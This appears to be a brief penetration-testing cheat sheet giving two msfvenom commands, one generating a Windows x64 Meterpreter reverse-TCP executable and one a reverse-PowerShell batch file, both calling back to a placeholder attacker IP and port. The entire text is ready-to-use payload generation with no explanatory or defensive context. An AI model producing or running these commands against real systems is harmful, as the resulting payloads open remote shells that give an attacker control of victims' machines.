Generate Reverse Shell as exe
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp -f exe  LHOST={IP} LPORT={PORT} -o payload.exe
```

Generate Reverse Shell as bat
```bash
msfvenom -p cmd/windows/reverse_powershell LHOST={IP} LPORT={PORT} > 1.bat
```

